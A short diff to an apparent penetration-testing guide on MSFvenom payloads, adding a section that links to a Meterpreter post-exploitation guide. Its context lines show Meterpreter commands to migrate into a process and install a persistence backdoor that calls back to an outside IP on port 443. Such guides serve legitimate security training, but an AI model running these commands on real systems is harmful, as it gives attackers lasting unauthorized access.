@@ -1034,4 +1034,8 @@ meterpreter > migrate <stable_process_pid>
 meterpreter > run persistence -X -i 10 -p 443 -r 10.10.14.113
 ```
 
-This comprehensive coverage of MSFvenom payload crafting provides the foundation for understanding both the technical aspects and practical applications of standalone payload generation in penetration testing scenarios. 
+This comprehensive coverage of MSFvenom payload crafting provides the foundation for understanding both the technical aspects and practical applications of standalone payload generation in penetration testing scenarios.
+
+## Advanced Meterpreter Techniques
+
+For detailed post-exploitation techniques, advanced commands, and comprehensive Meterpreter usage, see the dedicated [Meterpreter Post-Exploitation Guide](meterpreter.md). 
